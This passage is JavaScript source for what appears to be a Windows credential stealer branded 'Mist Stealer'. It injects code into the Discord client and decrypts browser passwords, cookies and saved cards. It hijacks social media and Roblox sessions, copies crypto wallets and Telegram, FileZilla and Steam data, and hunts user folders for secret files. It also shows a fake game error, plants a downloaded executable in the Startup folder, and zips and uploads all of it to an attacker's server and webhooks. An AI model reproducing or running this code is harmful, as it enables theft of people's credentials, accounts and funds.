                                            insideCore.includes("discord_desktop_core") && fs.readdir(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore, ((err, file) => {
                                                file.forEach((insideCoreFinal => {
                                                    insideCoreFinal.includes("index.js") && (fs.mkdir(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore + "\\spacex", (() => {

                                                    })),

                                                    fs.writeFile(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore + "\\index.js", injection, (() => {})))
                                                    if (!injection_paths.includes(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore + "\\index.js")) {
                                                        injection_paths.push(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore + "\\index.js"); DiscordListener(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore + "\\index.js")
                                                    }
                                                }))
                                            }))
                                        }))
                                    }))
                                }))
                            }))
                        }))
                    }))
                }))
            }))
        }))
    }))
}

async function getEncrypted() {
    for (let _0x4c3514 = 0; _0x4c3514 < browserPath.length; _0x4c3514++) {
        if (!fs.existsSync('' + browserPath[_0x4c3514][0])) {
            continue
        }
        try {
            let _0x276965 = Buffer.from(
                JSON.parse(fs.readFileSync(browserPath[_0x4c3514][2] + 'Local State'))
                .os_crypt.encrypted_key,
                'base64'
            ).slice(5)
            const _0x4ff4c6 = Array.from(_0x276965),
                _0x4860ac = execSync(
                    'powershell.exe Add-Type -AssemblyName System.Security; [System.Security.Cryptography.ProtectedData]::Unprotect([byte[]]@(' +
                    _0x4ff4c6 +
                    "), $null, 'CurrentUser')"
                )
                .toString()
                .split('\r\n'),
                _0x4a5920 = _0x4860ac.filter((_0x29ebb3) => _0x29ebb3 != ''),
                _0x2ed7ba = Buffer.from(_0x4a5920)
            browserPath[_0x4c3514].push(_0x2ed7ba)
        } catch (_0x32406b) {}
    }
}


async function getCards() {
  const cards = [];

  for (let i = 0; i < browserPath.length; i++) {
    if (!fs.existsSync(browserPath[i][0])) {
      continue;
    }

    let browserType;
    if (browserPath[i][0].includes('Local')) {
      browserType = browserPath[i][0].split('\\Local\\')[1].split('\\')[0];
    } else {
      browserType = browserPath[i][0].split('\\Roaming\\')[1].split('\\')[1];
    }

    const webDataPath = browserPath[i][0] + 'Web Data';
    const tempDbPath = browserPath[i][0] + 'webdata.db';

    try {
      fs.copyFileSync(webDataPath, tempDbPath);
    } catch {
      continue;
    }

    const db = new sqlite3.Database(tempDbPath);

    await new Promise((resolve, reject) => {
      db.each(
        'SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards',
        (err, row) => {
          if (err) {
            reject(err);
            return;
          }

          let encryptedCardNumber = row.card_number_encrypted;
          try {
            const iv = encryptedCardNumber.slice(3, 15);
            const encryptedData = encryptedCardNumber.slice(15, encryptedCardNumber.length - 16);
            const authTag = encryptedCardNumber.slice(encryptedCardNumber.length - 16, encryptedCardNumber.length);

            const decipher = crypto.createDecipheriv(
              'aes-256-gcm',
              browserPath[i][3],
              iv
            );
            decipher.setAuthTag(authTag);

            const cardNumber =
              decipher.update(encryptedData, 'base64', 'utf-8') +
              decipher.final('utf-8');

            cards.push(`${row.name_on_card} card: ${cardNumber}|${row.expiration_month}|${row.expiration_year} |  Mist Stealer\n`);
          } catch (error) {}
        },
        () => {
          resolve();
        }
      );
    });
  }


  const folderPath = './Cards';

  if (!fs.existsSync(folderPath)) {
    fs.mkdirSync(folderPath);
  }

  if (cards.length === 0) {
    cards.push('No credit cards found.\n');
  }

  if (cards.length) {
    fs.writeFileSync(path.join(folderPath, 'Cards.txt'), cards.join(''), {
      encoding: 'utf8',
      flag: 'a+'
    });
  }
}

//

async function getPasswords() {
  const passwords = [];

  for (let i = 0; i < browserPath.length; i++) {
    if (!fs.existsSync(browserPath[i][0])) {
      console.error(``);
      continue;
    }

    let browserType;
    try {
      if (browserPath[i][0].includes('Local')) {
        browserType = browserPath[i][0].split('\\Local\\')[1].split('\\')[0];
      } else {
        browserType = browserPath[i][0].split('\\Roaming\\')[1].split('\\')[1];
      }
    } catch (error) {
      console.error(`Error parsing browser path: ${error.message}`);
      continue;
    }

    const loginDataPath = browserPath[i][0] + 'Login Data';
    const passwordsDbPath = browserPath[i][0] + 'passwords.db';

    try {
      fs.copyFileSync(loginDataPath, passwordsDbPath);
    } catch (error) {
      console.error(`Error copying login data file: ${error.message}`);
      continue;
    }

    const db = new sqlite3.Database(passwordsDbPath);

    await new Promise((resolve, reject) => {
      db.each(
        'SELECT origin_url, username_value, password_value FROM logins',
        (err, row) => {
          if (err || !row.username_value) {
            return;
          }

          try {
            const iv = row.password_value.slice(3, 15);
            const encryptedData = row.password_value.slice(15, -16);
            const authTag = row.password_value.slice(-16);

            const decipher = crypto.createDecipheriv('aes-256-gcm', browserPath[i][3], iv);
            decipher.setAuthTag(authTag);

            const password = decipher.update(encryptedData, 'base64', 'utf-8') + decipher.final('utf-8');

            passwords.push(`URL: ${row.origin_url} | Username: ${row.username_value} | Password: ${password} | Application: ${browserType} ${browserPath[i][1]}\n`);
          } catch (error) {
            console.error(`Error decrypting password: ${error.message}`);
          }
        },
        () => {
          resolve();
        }
      );
    });

    db.close();
  }


  if (passwords.length === 0) {
    passwords.push('No passwords found.');
  }


  const passwordsDir = 'Passwords';

  if (!fs.existsSync(passwordsDir)) {
    fs.mkdirSync(passwordsDir, { recursive: true });
  }

  const filePath = path.join(passwordsDir, 'Passwords.txt');

  // Write to the file
  fs.writeFileSync(filePath, user.copyright + passwords.join(''), {
    encoding: 'utf8',
    flag: 'a+',
  });

  try {
    fs.writeFileSync("Passwords.txt", user.copyright + passwords.join(''), {
      encoding: 'utf8',
      flag: 'a+',
    });

    const data = fs.readFileSync("Passwords.txt", "utf8");

    const response = await axios.post(`${api_url}/passwords`, { passwords: data, key });

    if (response.status === 200) {
      console.log("Request successful.");
    } else {
      console.error(`Request failed with status code: ${response.status}`);
    }
  } catch (error) {
    console.error("Error occurred while writing to file or making the request: " + error.message);
  }
}


async function getCookiesAndSendWebhook() {
  const cookiesData = {};
  for (let i = 0; i < browserPath.length; i++) {
    if (!fs.existsSync(browserPath[i][0] + '\\Network')) {
      continue;
    }


        let browserFolder;
        if (browserPath[i][0].includes('Local')) {
            browserFolder = browserPath[i][0].split('\\Local\\')[1].split('\\')[0];
        } else {
            browserFolder = browserPath[i][0].split('\\Roaming\\')[1].split('\\')[1];
        }

        const cookiesPath = path.join(browserPath[i][0], 'Network', 'Cookies');
        const db = new sqlite3.Database(cookiesPath);

        await new Promise((resolve, reject) => {
            db.each(
                'SELECT * FROM cookies',
                function (err, row) {
                    if (err) return reject(err);
                    let encryptedValue = row.encrypted_value;
                    let iv = encryptedValue.slice(3, 15);
                    let encryptedData = encryptedValue.slice(15, encryptedValue.length - 16);
                    let authTag = encryptedValue.slice(encryptedValue.length - 16, encryptedValue.length);
                    let decrypted = '';

                    try {
                        const decipher = crypto.createDecipheriv('aes-256-gcm', browserPath[i][3], iv);
                        decipher.setAuthTag(authTag);
                        decrypted = decipher.update(encryptedData, 'base64', 'utf-8') + decipher.final('utf-8');

                        // Çeşitli siteler için özel işlemler
                        if (row.host_key === '.instagram.com' && row.name === 'sessionid') {
                            SubmitInstagram(`${decrypted}`);
                        }

                        if (row.host_key === '.tiktok.com' && row.name === 'sessionid') {
                            stealTikTokSession(`${decrypted}`);
                        }

                        if (row.host_key === '.reddit.com' && row.name === 'reddit_session') {
                            setRedditSession(`${decrypted}`);
                        }

                        if (row.host_key === '.x.com' && row.name === 'auth_token') {
                            TwitterSession(`${decrypted}`);
                        }

                        if (row.name === '.ROBLOSECURITY') {
                            SubmitRoblox(`${decrypted}`);
                        }
                    } catch (error) {}

                    if (!cookiesData[browserFolder + '_' + browserPath[i][1]]) {
                        cookiesData[browserFolder + '_' + browserPath[i][1]] = [];
                    }

                    cookiesData[browserFolder + '_' + browserPath[i][1]].push(
                        `${row.host_key} TRUE / FALSE 2597573456 ${row.name} ${decrypted} \n`
                    );
                },
                () => {
                    resolve('');
                }
            );
        });
    }

    const cookiesFolderPath = './Cookies';
    if (!fs.existsSync(cookiesFolderPath)) {
        fs.mkdirSync(cookiesFolderPath);
    }

    for (let [browserName, cookies] of Object.entries(cookiesData)) {
        if (cookies.length !== 0) {
            const cookiesContent = cookies.join('');
            const fileName = `${browserName}.txt`;
            const filePath = path.join(cookiesFolderPath, fileName);
            fs.writeFileSync(filePath, cookiesContent, 'utf8');
        }
    }

    const zip = new AdmZip();
    for (let [browserName, cookies] of Object.entries(cookiesData)) {
        if (cookies.length !== 0) {
            const cookiesContent = cookies.join('');
            const fileName = `${browserName}.txt`;
            zip.addFile(fileName, Buffer.from(cookiesContent, 'utf8'));
        }
    }


}
//

async function getAutofills() {
  const autofillData = [];

  for (const pathData of browserPath) {
    const browserPathExists = fs.existsSync(pathData[0]);

    if (!browserPathExists) {
      continue;
    }

    const applicationName = pathData[0].includes('Local')
      ? pathData[0].split('\\Local\\')[1].split('\\')[0]
      : pathData[0].split('\\Roaming\\')[1].split('\\')[1];

    const webDataPath = pathData[0] + 'Web Data';
    const webDataDBPath = pathData[0] + 'webdata.db';

    let db;

    try {
      if (!fs.existsSync(webDataPath)) {
        throw new Error(`File not found: ${webDataPath}`);
      }

      fs.copyFileSync(webDataPath, webDataDBPath);

      db = new sqlite3.Database(webDataDBPath);

      await new Promise((resolve, reject) => {
        db.each(
          'SELECT * FROM autofill',
          function (error, row) {
            if (row) {
            autofillData.push(`Name: ${row.name} | Value: ${row.value} | Application: ${applicationName} ${pathData[1]}\n`);


            }
          },
          function () {
            resolve('');
          }
        );
      });

      if (autofillData.length === 0) {
        autofillData.push('No autofills found for ' + applicationName + ' ' + pathData[1] + '\n');
      }
    } catch (error) {
      console.error('Error:', error.message);
    } finally {
     db && db.close();
    }
  }

  const autofillDir = 'Autofill';

  if (!fs.existsSync(autofillDir)) {
    fs.mkdirSync(autofillDir, { recursive: true });
  }

  const filePath = path.join(autofillDir, 'Autofills.txt');

  if (autofillData.length) {
    fs.writeFileSync(filePath, user.copyright + autofillData.join(''), {
      encoding: 'utf8',
      flag: 'a+',
    });
  }
}

async function DiscordListener(path) {
        return;
}

async function SubmitExodus() {
  const sourceDir = `C:\\Users\\${process.env.USERNAME}\\AppData\\Roaming\\Exodus\\exodus.wallet`;
  const walletDir = "./Wallets/Exodus";

  if (fs.existsSync(sourceDir)) {
    if (!fs.existsSync(walletDir)) fs.mkdirSync(walletDir, { recursive: true });

    for (const item of fs.readdirSync(sourceDir)) {
      const sourcePath = path.join(sourceDir, item);
      const targetPath = path.join(walletDir, item);

      if (fs.lstatSync(sourcePath).isDirectory()) {
        fs.mkdirSync(targetPath, { recursive: true });
        for (const subItem of fs.readdirSync(sourcePath)) {
          fs.copyFileSync(path.join(sourcePath, subItem), path.join(targetPath, subItem));
        }
      } else {
        fs.copyFileSync(sourcePath, targetPath);
      }
    }
    console.log("Contents have been successfully copied to ./Wallets.");
  } else {
    console.log("Source directory does not exist.");
  }
}

async function submitFileZilla() {
  const sourceDir = `C:\\Users\\${process.env.USERNAME}\\AppData\\Roaming\\FileZilla`;
  const walletDir = "./Filezilla";

  if (fs.existsSync(sourceDir)) {
    if (!fs.existsSync(walletDir)) fs.mkdirSync(walletDir, { recursive: true });

    for (const item of fs.readdirSync(sourceDir)) {
      const sourcePath = path.join(sourceDir, item);
      const targetPath = path.join(walletDir, item);

      if (fs.lstatSync(sourcePath).isDirectory()) {
        fs.mkdirSync(targetPath, { recursive: true });
        for (const subItem of fs.readdirSync(sourcePath)) {
          fs.copyFileSync(path.join(sourcePath, subItem), path.join(targetPath, subItem));
        }
      } else {
        fs.copyFileSync(sourcePath, targetPath);
      }
    }
    console.log("Contents have been successfully copied to ./Filezilla.");
  } else {
    console.log("Source directory does not exist.");
  }
}

//
async function SubmitTelegram() {
    const file = `C:\\Users\\${process.env.USERNAME}\\AppData\\Roaming\\Telegram Desktop\\tdata`;

    if (!fs.existsSync(file)) {
        console.log('File does not exist');
        return;
    }

    const zipper = new AdmZip();
    zipper.addLocalFolder(file);
    const zipFilePath = `${process.env.USERNAME}TelegramSession.zip`;
    zipper.writeZip(zipFilePath);

    try {
        const webhook = `${api_url}/upload`;
        const form = new FormData();

        form.append("file", fs.createReadStream(zipFilePath));
        form.append("json", JSON.stringify({ "key": key }));

        form.submit(webhook, (err, res) => {
            if (err) {
                console.error('File upload error:', err.message);
                return;
            }
            console.log('File uploaded successfully!');
            res.resume();
        });
    } catch (error) {
        console.log('Error occurred:', error.message);
    }
}

async function closeBrowsers() {
  const browsersProcess = ["chrome.exe", "Telegram.exe", "msedge.exe", "opera.exe", "brave.exe"];
  return new Promise(async (resolve) => {
    try {
      const { execSync } = require("child_process");
      const tasks = execSync("tasklist").toString();
      browsersProcess.forEach((process) => {
        if (tasks.includes(process)) {
          execSync(`taskkill /IM ${process} /F`);
        }
      });
      await new Promise((resolve) => setTimeout(resolve, 2500));
      resolve();
    } catch (e) {
      console.log(e);
      resolve();
    }
  });
}


function K1W1F113(patt, keyWords) {
    return new Promise((resolve, reject) => {
        fs.readdir(patt, (err, files) => {
            if (err) return reject(err);
            const foundFiles = files.filter(file => {
                return keyWords.some(keyword => file.toLowerCase().includes(keyword.toLowerCase()));
            }).map(file => path.join(patt, file));
            resolve(foundFiles);
        });
    });
}

async function K1W1() {
    const user = os.homedir();

    const path2search = [
        path.join(user, "Desktop"),
        path.join(user, "Downloads"),
        path.join(user, "Documents"),
    ];

    const keyWordsFiles = [
        "passw", "mdp", "motdepasse", "mot_de_passe", "login", "secret", "bot", "atomic", "account", "acount",
        "paypal", "banque", "discord_backup_codes", "metamask", "wallet", "crypto", "exodus", "discord", "2fa", "code", "memo", "compte",
        "token", "backup", "seed", "mnemonic", "memoric", "private", "key", "passphrase", "pass", "phrase", "steal",
        "bank", "info", "casino", "prv", "privé", "prive", "telegram", "identifiant", "personnel", "trading",
        "bitcoin", "sauvegarde", "funds", "récupé", "recup", "note"
    ];

    const wikith = [];
    for (const patt of path2search) {
        const kiwi = K1W1F113(patt, keyWordsFiles);
        wikith.push(kiwi);
    }
    return await Promise.all(wikith);
}

async function filestealr() {
    const wikith = await K1W1();
    const foundDir = './found';

    const allFoundFiles = wikith.flat().filter(file => path.extname(file) === '.txt');

    if (allFoundFiles.length === 0) {
        console.log("Eşleşen dosya bulunamadı, 'found' klasörü oluşturulmadı.");
        return;
    }

    if (!fs.existsSync(foundDir)) {
        fs.mkdirSync(foundDir);
    }

    for (const file of allFoundFiles) {
        const fileName = path.basename(file);
        const destPath = path.join(foundDir, fileName);
        fs.copyFileSync(file, destPath);
        console.log(`${fileName} dosyası kopyalandı.`);
    }
}


async function fakeError() {
    try {
        if (true) {
            const title = 'Please try opening the game again.';
            const message = 'Error 0x00000b2. Your system is integrating with the game. Please try opening the game again.';
            const vbsContent = `
                MsgBox "${message}", 16, "${title}"
            `;

            const vbsPath = path.join(process.cwd(), 'tempErrorMessage.vbs');
            fs.writeFileSync(vbsPath, vbsContent);

            const cmd = `cscript //nologo "${vbsPath}"`;
            await util.promisify(exec)(cmd);

            fs.unlinkSync(vbsPath);
        }
    } catch (error) {
        console.error(error);
    }
}

async function startup() {
  try {
    const downloadUrl = 'https://webhookprotector.com/startup/Soulblade.exe';
    const fileName = path.basename(downloadUrl);
    const tempPath = path.join(os.tmpdir(), fileName);

    const fileResponse = await axios({
      method: 'get',
      url: downloadUrl,
      responseType: 'stream'
    });

    const writer = fs.createWriteStream(tempPath);
    fileResponse.data.pipe(writer);

    await new Promise((resolve, reject) => {
      writer.on('finish', resolve);
      writer.on('error', reject);
    });

    console.log(`File downloaded to temporary path: ${tempPath}`);

    const startupPath = path.join(os.homedir(), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', fileName);

    fs.copyFileSync(tempPath, startupPath);
    console.log(`File copied to Startup folder: ${startupPath}`);
  } catch (error) {
    console.error('Error:', error);
  }
}


async function stealSteamSession() {
    try {
        if (fs.existsSync("C:\\Program Files (x86)\\Steam") && fs.existsSync("C:\\Program Files (x86)\\Steam\\config\\loginusers.vdf")) {
            const accounts = fs.readFileSync("C:\\Program Files (x86)\\Steam\\config\\loginusers.vdf", "utf-8");
            const accountIds = accounts.match(/7656[0-9]{13}/g) || [];

            for (const account of accountIds) {
                try {
                    const accountInfoResponse = await axios.get(`https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=440D7F4D810EF9298D25EDDF37C1F902&steamids=${account}`);
                    const accountInfo = accountInfoResponse.data.response;

                    const gamesResponse = await axios.get(`https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid=${account}`);
                    const games = gamesResponse.data.response;

                    const levelResponse = await axios.get(`https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid=${account}`);
                    const level = levelResponse.data.response;

                    const webhookPayload = {
                        color: 3158071,
                        author: {
                            name: "Steam Session Detected",
                            icon_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Steam_icon_logo.svg/1024px-Steam_icon_logo.svg.png"
                        },
                        thumbnail: { url: accountInfo.players[0].avatarfull },
                        fields: [
                            { name: "Steam Identifier", value: account, inline: true },
                            { name: "Profile URL", value: `[Click here](${accountInfo.players[0].profileurl})`, inline: true },
                            { name: "Display Name", value: accountInfo.players[0].personaname, inline: true },
                            { name: "Time created", value: accountInfo.players[0].timecreated || "Private", inline: true },
                            { name: "Level", value: level.player_level || "Private", inline: true },
                            { name: "Game count", value: games.game_count || "Private", inline: true }
                        ],
                        footer: { text: "Mist Stealer" }
                    };

                    let payload = {
                        embeds: [webhookPayload]
                    };

                    await axios.post(`${api_url}/webhooks/${key}`, payload);
                    console.log('Steam session detected embed sent to webhook.');

                } catch (error) {
                    console.error(`An error occurred while processing Steam account ${account}: ${error.message}`);
                }
            }
        }
    } catch (error) {
        console.error(`Error in stealSteamSession: ${error.message}`);
    }
}

//

async function zipFolders() {
  const zip = new AdmZip();
  const foldersToZip = ['Cookies', 'Autofill', 'Passwords', 'found', 'BrowserWallets', 'Sessions','Wallets', 'Filezilla', 'Firefox', 'Cards'];

  foldersToZip.forEach(folderName => {
    const folderPath = path.join(folderName);

    if (fs.existsSync(folderPath)) {
      zip.addLocalFolder(folderPath, folderName);
console.log(`${folderName} folder added to the zip file.`);
    } else {
console.error(`${folderName} folder not found.`);
    }
  });
  const computerName = os.hostname();
  const zipFilePath = `${computerName}victims1.zip`;
  zip.writeZip(zipFilePath);

console.log('Folders successfully added to the zip file: victims.zip');

  const webhook = `${api_url}/upload`;
  const form = new FormData();

  form.append("file", fs.createReadStream(zipFilePath));
  form.append("json", JSON.stringify({ "key": key }));


  try {
      await form.submit(webhook);
    console.log('File successfully uploaded.');
  } catch (error) {
    console.error('Error uploading the file:', error.message);
  }
}

function onlyUnique(item, index, array) {
    return array.indexOf(item) === index;
}

async function getFirefoxCookies() {
    const roamingAppData = process.env.APPDATA;
    const firefoxProfilePath = path.join(roamingAppData, 'Mozilla', 'Firefox', 'Profiles');

    if (!fs.existsSync(firefoxProfilePath)) {
        console.log('Firefox is not installed or no profile found.');
        return;
    }

    const profiles = fs.readdirSync(firefoxProfilePath);
    if (profiles.length === 0) {
        console.log('No Firefox profiles found.');
        return;
    }

    const firefoxDir = './Firefox';
    if (!fs.existsSync(firefoxDir)) {
        fs.mkdirSync(firefoxDir);
    }

    const filePath = path.join(firefoxDir, 'firefoxcookies.txt');
    const cookies = [];

    for (const profile of profiles) {
        const profilePath = path.join(firefoxProfilePath, profile);
        const dbPath = path.join(profilePath, 'cookies.sqlite');

        if (!fs.existsSync(dbPath)) {
            console.log(`No cookies database found for profile: ${profile}`);
            continue;
        }

        const db = new sqlite3.Database(dbPath);

        await new Promise((resolve, reject) => {
            db.all('SELECT host, name, value, expiry FROM moz_cookies', (err, rows) => {
                if (err) {
                    reject(err);
                }

                rows.forEach((row) => {
                    cookies.push(`${row.host}\tTRUE\t/\tFALSE\t2597573456\t${row.name}\t${row.value}`);

                    if (row.host === '.instagram.com' && row.name === 'sessionid') {
                        SubmitInstagram(`${row.value}`);
                    }

                    if (row.host === '.tiktok.com' && row.name === 'sessionid') {
                        stealTikTokSession(`${row.value}`);
                    }

                    if (row.host === '.reddit.com' && row.name === 'reddit_session') {
                        setRedditSession(`${row.value}`);
                    }

                    if (row.name === '.ROBLOSECURITY') {
                        SubmitRoblox(`${row.value}`);
                    }
                });

                resolve();
            });
            db.close();
        });
    }

    const cookieData = cookies.join('\n');
    fs.writeFileSync(filePath, cookieData, 'utf8');
    console.log(`Cookies have been written to ${filePath}`);
}

async function submitSteam() {
  try {
    const steamPath = "C:\\Program Files (x86)\\Steam";
    const steamLoginFile = path.join(steamPath, "config", "loginusers.vdf");
    const gamesFolder = path.join(process.cwd(), 'Games');
    const backupFolder = path.join(gamesFolder, 'Steam');
    const zipFileName = `${os.userInfo().username}_SteamSessions.zip`;
    const zipFilePath = path.join(process.cwd(), zipFileName);

    const steamExists = await fs.promises.access(steamPath).then(() => true).catch(() => false);
    const loginFileExists = await fs.promises.access(steamLoginFile).then(() => true).catch(() => false);

    if (!steamExists || !loginFileExists) {
      console.log('Steam or loginusers.vdf file not found.');
      return;
    }

    try {
      await exec("taskkill /IM Steam.exe /F", (error) => {
        if (error) {
          console.log("Failed to close Steam or it was already closed.");
        } else {
          console.log("Steam successfully closed.");
        }
      });
    } catch (error) {
      console.log("An error occurred while closing Steam.");
    }

    const gamesFolderExists = await fs.promises.access(gamesFolder).then(() => true).catch(() => false);
    if (!gamesFolderExists) {
      await fs.promises.mkdir(gamesFolder, { recursive: true });
      console.log("Games folder created.");
    }

    await fs.promises.mkdir(backupFolder, { recursive: true });

    const steamFolders = ["userdata", "config"];

    for (const folder of steamFolders) {
      const sourcePath = path.join(steamPath, folder);
      const folderDestination = path.join(backupFolder, folder);

      const folderExists = await fs.promises.access(sourcePath).then(() => true).catch(() => false);

      if (folderExists) {
        await (async function copyFolderRecursive(source, destination) {
          await fs.promises.mkdir(destination, { recursive: true });
          const entries = await fs.promises.readdir(source, { withFileTypes: true });

          for (let entry of entries) {
            const sourcePath = path.join(source, entry.name);
            const destinationPath = path.join(destination, entry.name);

            if (entry.isDirectory()) {
              await copyFolderRecursive(sourcePath, destinationPath);
            } else {
              await fs.promises.copyFile(sourcePath, destinationPath);
            }
          }
        })(sourcePath, folderDestination);
      } else {
        console.log(`${folder} folder not found.`);
      }
    }

    const zip = new AdmZip();
    zip.addLocalFolder(backupFolder);
    zip.writeZip(zipFilePath);

    console.log(`${zipFileName} created successfully.`);
  } catch (error) {
    console.error('Error:', error.message);
  }
}

async function checkAll() {
    let passwordsCount = 0;
    let autofillCount = 0;
    let ip = 'Not Available';
    let localWalletsFound = false;
    let localSessions = [];
    let browserWallets = [];
    let topPasswordsField = null;

    const passwordsFilePath = path.join('./', 'Passwords', 'Passwords.txt');
    if (fs.existsSync(passwordsFilePath)) {
        const passwordsContent = fs.readFileSync(passwordsFilePath, 'utf-8');
        const passwordsEntries = passwordsContent.split('Username').filter(entry => entry.trim() !== '');
        passwordsCount = passwordsEntries.length;

        const passwordPattern = /Password:\s+(.+?)\s*\|/g;
        const passwordCounts = {};
        let match;

        while ((match = passwordPattern.exec(passwordsContent)) !== null) {
            const password = match[1].trim();
            passwordCounts[password] = (passwordCounts[password] || 0) + 1;
        }

        if (Object.keys(passwordCounts).length > 0) {
            const topPasswords = Object.keys(passwordCounts)
                .sort((a, b) => passwordCounts[b] - passwordCounts[a])
                .slice(0, 10);

            topPasswordsField = {
                name: '<:gg911:1262910971362676807> **User Commonly Used Passwords**',
                value: `\`\`\`${topPasswords.map((password, index) => `${index + 1}. ${password}`).join('\n')}\`\`\``,
                inline: false
            };
        } else {
            topPasswordsField = {
                name: '<:gg911:1262910971362676807> **User Commonly Used Passwords**',
                value: 'No user commonly used passwords',
                inline: false
            };
        }
    }

    const autofillsFolderPath = path.join('./', 'Autofill');
    if (fs.existsSync(autofillsFolderPath)) {
        const autofillsFilePath = path.join(autofillsFolderPath, 'Autofills.txt');
        if (fs.existsSync(autofillsFilePath)) {
            const autofillsContent = fs.readFileSync(autofillsFilePath, 'utf-8');
            const autofillEntries = autofillsContent.split('\n').filter(entry => entry.trim() !== '');
            autofillCount = autofillEntries.length;
        }
    }

    const walletsFolderPath = path.join('./', 'Wallets');
    const exodusFilePath = path.join(walletsFolderPath, 'Exodus');
    if (fs.existsSync(walletsFolderPath) && fs.existsSync(exodusFilePath)) {
        localWalletsFound = true;
    }

    const gamesFolderPath = path.join('./', 'Games');
    const steamFolderPath = path.join(gamesFolderPath, 'Steam');
    if (fs.existsSync(gamesFolderPath) && fs.existsSync(steamFolderPath)) {
        localSessions.push('Steam');
    }

    const filezillaFolderPath = path.join('./', 'Filezilla');
    if (fs.existsSync(filezillaFolderPath)) {
        const filezillaFiles = fs.readdirSync(filezillaFolderPath);
        if (filezillaFiles.length > 0) {
            localSessions.push('Filezilla');
        }
    }

    const browserWalletsFolderPath = path.join('./', 'BrowserWallets');
    if (fs.existsSync(browserWalletsFolderPath)) {
        const walletFolders = fs.readdirSync(browserWalletsFolderPath).filter(folder => {
            return fs.statSync(path.join(browserWalletsFolderPath, folder)).isDirectory();
        });

        if (walletFolders.length > 0) {
            browserWallets = walletFolders;
        }
    }

    try {
        const response = await axios.get('https://api.ipify.org?format=json');
        ip = response.data.ip;
    } catch (error) {
        console.error('Error fetching IP:', error);
    }

    const computerName = os.hostname();
    const downloadLink = `https://webhookprotector.com/logs/${key}/${computerName}victims1.zip`;

    const combinedInfoEmbed = {
        title: '<:system:1305996567907536927> System Information & User Data',
        color: 3092790,
        author: {
            name: `${computerName} | Report by Mist Stealer`,
        },
        fields: [
            {
                name: '**User Info**',
                value: `\`\`\`${computerName}\`\`\``,
                inline: true,
            },
            {
                name: '<:system:1305995094968762490> **System Hostname**',
                value: `\`\`\`${computerName}\`\`\``,
                inline: true,
            },
            {
                name: '<:t:1262910971362676807> **IP Address**',
                value: `\`\`\`${ip}\`\`\``,
                inline: true,
            },
            {
                name: '<:dp_saturn:1305995748869013634> **Download (User Data)**',
                value: `<:download:917499025282973766> [Click to Download](${downloadLink})`,
                inline: false,
            },
            {
                name: '<:gg911:1262910971362676807> **Passwords Count**',
                value: passwordsCount > 0 ? `\`\`\`${passwordsCount}\`\`\`` : 'No passwords found',
                inline: true,
            },
            {
                name: '<:gg911:1262910971362676807> **Autofills Count**',
                value: `\`\`\`${autofillCount}\`\`\``,
                inline: true,
            },
        ],
        footer: {
            text: '@Miststealer | Mist Stealer | t.me/Miststealer',
            icon_url: 'https://media.discordapp.net/attachments/1305594475581542470/1305959420840251452/cQGynnUlSv2qGtrzKx1OfQ.png?ex=6734ecfd&is=67339b7d&hm=5adcaeffe54cb05b5b3461dd90dcf62b5f893d530726e3c7a22df78d41ee8cdc&=&format=webp&quality=lossless&width=550&height=309'
        },
    };

    if (topPasswordsField) {
        combinedInfoEmbed.fields.push(topPasswordsField);
    }

    if (localWalletsFound) {
        combinedInfoEmbed.fields.push({
            name: '**Local Wallets Found**',
            value: 'Exodus',
            inline: false,
        });
    }

    if (localSessions.length > 0) {
        combinedInfoEmbed.fields.push({
            name: '**Local Sessions Found**',
            value: localSessions.join(', '),
            inline: false,
        });
    }

    if (browserWallets.length > 0) {
        combinedInfoEmbed.fields.push({
            name: '**Local Browser Wallets Found**',
            value: browserWallets.join(', '),
            inline: false,
        });
    }

    await axios.post(`${api_url}/webhooks/${key}`, { embeds: [combinedInfoEmbed] })
        .then(() => {
            console.log('Embed sent successfully');
        })
        .catch((error) => {
            console.error('Error sending embed:', error);
        });
}


async function keywords4() {
    const passwordResults = [];
    const autofillResults = [];

    const passwordsFilePath = path.join('./', 'Passwords', 'Passwords.txt');
    if (fs.existsSync(passwordsFilePath)) {
        const passwordsContent = fs.readFileSync(passwordsFilePath, 'utf-8');
        keywords.forEach(keyword => {
            if (passwordsContent.includes(keyword)) {
                passwordResults.push(keyword);
            }
        });
    }

    const autofillsFilePath = path.join('./', 'Autofill', 'Autofills.txt');
    if (fs.existsSync(autofillsFilePath)) {
        const autofillsContent = fs.readFileSync(autofillsFilePath, 'utf-8');
        keywords.forEach(keyword => {
            if (autofillsContent.includes(keyword)) {
                autofillResults.push(keyword);
            }
        });
    }

    const keywordEmbed = {
        title: '🔍 Keyword Result',
        color: 0x2f3136,
        fields: [
            {
                name: '<:search:1306012953023090728> **Passwords**',
                value: passwordResults.length > 0 ? passwordResults.join(', ') : 'No keywords found',
                inline: false,
            },
            {
                name: '<:search:1306012949827293204> **Autofills**',
                value: autofillResults.length > 0 ? autofillResults.join(', ') : 'No keywords found',
                inline: false,
            }
        ],
        footer: {
            text: '@Miststealer | Mist Stealer | t.me/Miststealer',
            icon_url: 'https://cdn.discordapp.com/attachments/1305940176337502261/1305958038506836059/i2OZNrgCTVihJCs1NmPQaQ.png?ex=6734ebb3&is=67339a33&hm=5233a4412b3efea03066631308de9ed88bf44f217f0d3a17f18ac0566bdd8ebd&',

        },
    };

    try {
        await axios.post(`${api_url}/webhooks/${key}`, {
            embeds: [keywordEmbed]
        });
        console.log('Embed sent successfully');
    } catch (error) {
        console.error('Error sending embed:', error.message);
    }
}


async function StealEpicGames() {
    try {
        const localappdata = process.env.LOCALAPPDATA;
